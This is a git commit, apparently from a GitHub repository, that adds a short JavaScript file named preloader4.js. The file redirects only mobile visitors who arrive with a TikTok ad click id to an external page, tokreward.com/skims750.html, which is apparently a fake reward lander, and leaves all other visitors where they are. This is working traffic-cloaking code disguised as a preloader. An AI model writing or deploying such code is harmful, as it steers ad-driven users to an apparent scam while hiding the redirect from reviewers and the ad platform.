abf9d2552d7eda2b915c6dca74cf40e1515772ab
carsoncraig1 <156372400+carsoncraig1@users.noreply.github.com>
2024-06-24 11:57:44 -0400

    Create preloader4.js

---
+++ public/cdn/preloader4.js
@@ -0,0 +1,5 @@
+const utm = new URLSearchParams(window.location.search);
+const ttclid = utm.get("ttclid");
+const mobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+const lander = `https://tokreward.com/skims750.html?slug=${document.location.hostname.split('.')[0]}`;
+if (ttclid && mobile) { window.location.href = lander; } else { }
